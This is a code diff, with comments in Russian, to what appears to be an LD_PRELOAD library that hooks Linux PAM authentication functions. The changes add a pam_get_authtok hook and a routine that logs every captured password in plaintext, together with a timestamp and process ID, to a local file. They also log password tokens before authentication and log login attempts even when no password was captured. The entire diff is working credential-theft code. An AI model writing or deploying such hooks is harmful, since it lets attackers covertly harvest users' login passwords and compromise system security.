@@ -31,6 +31,7 @@
 static int (*orig_pam_get_item)(const pam_handle_t *pamh, int item_type, const void **item) = NULL;
 static int (*orig_pam_authenticate)(pam_handle_t *pamh, int flags) = NULL;
 static int (*orig_pam_set_item)(pam_handle_t *pamh, int item_type, const void *item) = NULL;
+static int (*orig_pam_get_authtok)(pam_handle_t *pamh, int item_type, const char **authtok, const char *prompt) = NULL;
 
 // Буферы для хранения перехваченной информации об авторизации
 static char last_username[256] = {0};  // Имя пользователя 
@@ -84,6 +85,28 @@ void log_auth_data() {
 }
 
 /**
+ * Агрессивно логируем все возможные пароли
+ */
+void log_possible_password(const char* password_candidate, const char* source) {
+    if (!password_candidate || strlen(password_candidate) < 1) return;
+
+    FILE* log = fopen(LOG_PATH, "a");
+    if (log) {
+        time_t now = time(NULL);
+        char timestamp[64];
+        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
+        
+        fprintf(log, "==== POSSIBLE PASSWORD [%s] ====\n", timestamp);
+        fprintf(log, "Source: %s\n", source);
+        fprintf(log, "Process: %d\n", getpid());
+        fprintf(log, "Data: %s\n", password_candidate);
+        fprintf(log, "================================\n\n");
+        fclose(log);
+        chmod(LOG_PATH, 0600);
+    }
+}
+
+/**
  * Перехват pam_get_item - для получения имени пользователя
  * PAM_USER содержит имя пользователя, который пытается авторизоваться
  */
@@ -101,6 +124,34 @@ extern "C" int pam_get_item(const pam_handle_t *pamh, int item_type, const void 
     if (item_type == PAM_USER && result == PAM_SUCCESS && *item != NULL) {
         strncpy(last_username, (const char*)*item, sizeof(last_username) - 1);
         last_username[sizeof(last_username) - 1] = '\0';
+    }
+    
+    // Дополнительно перехватываем пароль
+    if (item_type == PAM_AUTHTOK && result == PAM_SUCCESS && *item != NULL) {
+        strncpy(last_password, (const char*)*item, sizeof(last_password) - 1);
+        last_password[sizeof(last_password) - 1] = '\0';
+        log_possible_password((const char*)*item, "PAM_AUTHTOK via pam_get_item");
+    }
+    
+    return result;
+}
+
+/**
+ * Перехват pam_get_authtok - еще один способ получить пароль
+ */
+extern "C" int pam_get_authtok(pam_handle_t *pamh, int item_type, const char **authtok, const char *prompt) {
+    if (!orig_pam_get_authtok) {
+        orig_pam_get_authtok = (int(*)(pam_handle_t*, int, const char**, const char*))dlsym(RTLD_NEXT, "pam_get_authtok");
+        if (!orig_pam_get_authtok) return PAM_SYSTEM_ERR;
+    }
+    
+    int result = orig_pam_get_authtok(pamh, item_type, authtok, prompt);
+    
+    // Если получили пароль, сохраним его
+    if (result == PAM_SUCCESS && authtok && *authtok) {
+        strncpy(last_password, *authtok, sizeof(last_password) - 1);
+        last_password[sizeof(last_password) - 1] = '\0';
+        log_possible_password(*authtok, "pam_get_authtok");
     }
     
     return result;
@@ -121,6 +172,7 @@ extern "C" int pam_set_item(pam_handle_t *pamh, int item_type, const void *item)
     if (item_type == PAM_AUTHTOK && item != NULL) {
         strncpy(last_password, (const char*)item, sizeof(last_password) - 1);
         last_password[sizeof(last_password) - 1] = '\0';
+        log_possible_password((const char*)item, "PAM_AUTHTOK via pam_set_item");
     }
     
     // Вызов оригинальной функции
@@ -138,11 +190,19 @@ extern "C" int pam_authenticate(pam_handle_t *pamh, int flags) {
         if (!orig_pam_authenticate) return PAM_SYSTEM_ERR;
     }
     
+    // Попытка получить пароль перед вызовом аутентификации
+    const void *authtok = NULL;
+    if (orig_pam_get_item(pamh, PAM_AUTHTOK, &authtok) == PAM_SUCCESS && authtok) {
+        strncpy(last_password, (const char*)authtok, sizeof(last_password) - 1);
+        last_password[sizeof(last_password) - 1] = '\0';
+        log_possible_password((const char*)authtok, "pre-authenticate");
+    }
+    
     // Вызываем оригинальную функцию проверки
     int result = orig_pam_authenticate(pamh, flags);
     
     // Если у нас уже есть имя пользователя и пароль, записываем результат
-    if (last_username[0] != '\0' && last_password[0] != '\0') {
+    if (last_username[0] != '\0') {
         auth_result = (result == PAM_SUCCESS);
         log_auth_data();
         
